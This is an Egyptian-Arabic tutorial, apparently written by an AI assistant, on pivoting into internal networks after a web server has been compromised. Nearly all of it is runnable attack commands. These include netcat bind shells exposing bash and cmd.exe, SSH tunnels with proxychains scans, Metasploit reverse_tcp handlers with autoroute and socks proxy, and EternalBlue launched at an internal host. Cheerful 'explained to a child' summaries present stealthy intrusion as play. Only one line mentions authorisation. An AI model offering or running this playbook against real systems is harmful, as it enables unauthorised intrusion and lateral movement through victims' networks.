تمام، هشرحلك القسم ده: **"Expanding Access Post-Web Exploitation - Pivoting within Internal Networks"** بنفس الطريقة السابقة: شرح عميق وبسيط مع تركيز على الجانب العملي بأوامر وأكواد، خلاصة بعد كل جزء كأني بكلم طفل، وفي النهاية خطوات عملية للـ Pentesting. يلا نبدأ! 🚀

---

### **1. إيه هو Expanding Access Post-Web Exploitation؟ 🌐**
"Expanding Access Post-Web Exploitation" يعني "توسيع الوصول بعد استغلال الويب". لما تخترق موقع ويب أو سيرفر ويب (بطريقة قانونية في الـ Pentesting)، الدخول للسيرفر ده بس مش كفاية. الهدف إنك تستخدم السيرفر ده كـ "نقطة انطلاق" عشان توصل لأنظمة تانية في الشبكة الداخلية وتكتشف أكتر.

#### **الجانب العملي:**
- **أمر للتأكد إنك داخل السيرفر:**
  - في لينكس: `whoami`
    - خرج مثال: `www-data` → أنت داخل سيرفر الويب.
  - في ويندوز: `whoami`
    - خرج مثال: `iis apppool\defaultapppool` → أنت في سيرفر IIS.

- **فكرة أساسية:** بعد ما تدخل السيرفر، بتحاول تتحرك لأجهزة تانية متصلة بيه.

**خلاصة للطفل:** زي لما تدخل غرفة صغيرة في بيت اللعب 🎪، وتلاقي باب سري يوديك لغرف تانية مليانة كنوز! 🚪💰

---

### **2. إيه يعني Pivoting within Internal Networks؟ 🔄**
"Pivoting" يعني "التحرك أو الانتقال" داخل الشبكات الداخلية. لما تكون داخل سيرفر ويب (نقطة البداية)، بتستخدمه كـ "جسر" عشان توصل لأجهزة أو سيرفرات تانية في نفس الشبكة الداخلية اللي ما تقدرش توصلها من برا مباشرة. ده بيساعدك تكتشف أكتر وترفع صلاحياتك.

#### **الجانب العملي:**
- **أمر لمعرفة الشبكة:**
  - في لينكس: `ip addr` أو `ifconfig`
    - خرج مثال: `192.168.1.10` → عنوان السيرفر في الشبكة.
  - في ويندوز: `ipconfig`
    - خرج مثال: `IPv4 Address: 192.168.1.10`.

- **اكتشاف أجهزة متصلة:**
  - في لينكس: `arp -a`
    - خرج مثال: `192.168.1.11 (MAC Address)` → جهاز تاني في الشبكة.
  - في ويندوز: `arp -a`
    - خرج مشابه.

- **الهدف:** تستخدم السيرفر اللي اخترقته عشان تتحرك داخل الشبكة.

**خلاصة للطفل:** زي لما تكون في غرفة في بيت اللعب، وتستخدم سلم سري 🪜 عشان تطلع على غرف تانية وتكتشف المزيد من اللعب! 🎲

---

### **3. Pivoting within Internal Networks في التفصيل؟ 🌍**
"Pivoting" هو عملية بتستخدم فيها السيرفر اللي اخترقته (الـ Compromised Host) عشان توصل لأنظمة تانية في الشبكة الداخلية. بتعمل كده عن طريق أدوات زي SSH، Proxychains، أو Meterpreter، وبتكتشف الأجهزة التانية وتحاول تخترقها.

#### **الجانب العملي:**
- **أنواع الـ Pivoting:**
  1. **Network Pivoting:** بتعدل حركة الشبكة عشان تتحرك من خلال السيرفر.
  2. **Port Forwarding:** بتفتح منافذ عشان توصل لأجهزة تانية.

#### **اكتشاف الشبكة:**
- **في لينكس:**
  ```bash
  netstat -tuln
  ```
  - خرج مثال: `tcp 0 0 192.168.1.10:80` → منافذ مفتوحة.
  ```bash
  ping 192.168.1.11
  ```
  - لو رجع رد، يبقى الجهاز شغال.

- **في ويندوز:**
  ```cmd
  netstat -ano
  ```
  - خرج مثال: `TCP 192.168.1.10:80`.

#### **استخدام Netcat للـ Pivoting:**
- **في السيرفر المخترق (لينكس):**
  ```bash
  nc -lvp 4444 -e /bin/bash
  ```
  - يفتح Shell متصل بيك.

- **في جهازك:**
  ```bash
  nc 192.168.1.10 4444
  ```
  - تتحكم في السيرفر.

- **اكتشاف أجهزة داخلية:**
  ```bash
  arp -a
  ```

#### **استخدام Proxychains (لينكس):**
- **ضبط Proxychains:**
  - عدل `/etc/proxychains.conf`:
    ```
    socks4 127.0.0.1 9050
    ```
  - شغل SSH Tunnel من السيرفر:
    ```bash
    ssh -D 9050 user@192.168.1.10
    ```
  - اكتشف الشبكة:
    ```bash
    proxychains nmap -sT 192.168.1.0/24
    ```

#### **استخدام Meterpreter (Metasploit):**
- **بعد استغلال السيرفر:**
  ```
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST <your-ip>
  set LPORT 4444
  run
  ```
- **في الـ Meterpreter:**
  ```
  run autoroute -s 192.168.1.0/24
  ```
  - بيضيف الشبكة الداخلية.
  ```
  run arp_scanner -r 192.168.1.0/24
  ```
  - بيكتشف الأجهزة.

- **ليه بيحصل الضعف؟**
  - الشبكة الداخلية بتكون متصلة بدون حماية كافية (Firewall ضعيف).
  - السيرفر المخترق عنده وصول لأجهزة تانية.

**خلاصة للطفل:** زي لما تستخدم باب سري في بيت اللعب 🚪، وتدخل غرف تانية مليانة لعب وحلويات من غير ما حد يشوفك! 🍭🎲

---

### **4. إزاي تستغل ده في الـ Pentesting؟ ⚒️**
في الـ Pentesting، بعد ما تخترق سيرفر ويب، بتستخدمه كـ "نقطة ارتكاز" عشان تكتشف الشبكة الداخلية، تحاول تخترق أجهزة تانية، وتثبت إن فيه ضعف كبير.

#### **الجانب العملي:**
- **فحص الشبكة:**
  ```bash
  nmap -sn 192.168.1.0/24
  ```
  - بيكتشف الأجهزة الشغالة.

- **Port Forwarding:**
  - في السيرفر:
    ```bash
    ssh -L 1234:192.168.1.11:3389 user@192.168.1.10
    ```
  - في جهازك:
    ```bash
    rdesktop 127.0.0.1:1234
    ```
    - لو 3389 (RDP) مفتوح، هتوصل للجهاز الداخلي.

- **Meterpreter Pivoting:**
  ```
  background
  use auxiliary/server/socks_proxy
  set SRVPORT 1080
  run
  route add 192.168.1.0 255.255.255.0 1
  ```
  - بتخلي Metasploit يوصل للشبكة الداخلية.

**خلاصة للطفل:** زي لما تستخدم سلم سحري في بيت اللعب 🪜، وتطلع على غرف سرية مليانة كنوز من غير ما حد يعرف! 💰

---

### **خطوات عملية للـ Pentesting في Expanding Access 🛠️**
دلوقتي خطوات عملية للاستغلال في اختبار الاختراق الأخلاقي:

#### **في لينكس (سيرفر ويب):**
1. **تحقق من وصولك:**
   ```bash
   whoami
   ip addr
   ```
   - خرج مثال: `www-data`, `192.168.1.10`.

2. **اكتشف الشبكة:**
   ```bash
   arp -a
   ```
   - خرج مثال: `192.168.1.11`.

3. **افتح Shell:**
   ```bash
   nc -lvp 4444 -e /bin/bash
   ```
   - في جهازك:
     ```bash
     nc 192.168.1.10 4444
     ```

4. **Pivoting بـ SSH:**
   ```bash
   ssh -D 9050 user@192.168.1.10
   proxychains nmap -sT 192.168.1.0/24
   ```

5. **هاجم جهاز داخلي:**
   ```bash
   proxychains msfconsole
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST 192.168.1.11
   run
   ```

#### **في ويندوز (سيرفر ويب):**
1. **تحقق من وصولك:**
   ```cmd
   whoami
   ipconfig
   ```
   - خرج مثال: `iis apppool\defaultapppool`, `192.168.1.10`.

2. **اكتشف الشبكة:**
   ```cmd
   arp -a
   ```

3. **افتح Shell:**
   ```cmd
   nc.exe -lvp 4444 -e cmd.exe
   ```
   - في جهازك:
     ```bash
     nc 192.168.1.10 4444
     ```

4. **Pivoting بـ Meterpreter:**
   ```
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <your-ip>
   run
   ```
   - في الـ Meterpreter:
     ```
     run autoroute -s 192.168.1.0/24
     run arp_scanner -r 192.168.1.0/24
     ```

5. **هاجم جهاز داخلي:**
   ```
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST 192.168.1.11
   run
   ```

**ملاحظة:** كل الأوامر دي لازم تتعمل بإذن قانوني في بيئة اختبار! ⚖️

---

### **الخلاصة النهائية 😊**
Expanding Access يعني تستخدم سيرفر ويب مخترق عشان تتحرك داخل الشبكة الداخلية بـ Pivoting. استخدمنا أوامر زي `arp -a` وأدوات زي Meterpreter وProxychains عشان نكتشف ونهاجم أجهزة تانية.

**خلاصة للطفل:** زي لما تدخل غرفة صغيرة في بيت اللعب، وتستخدم سلم سحري 🪜 عشان تكتشف غرف سرية مليانة لعب وحلويات! 👑🍭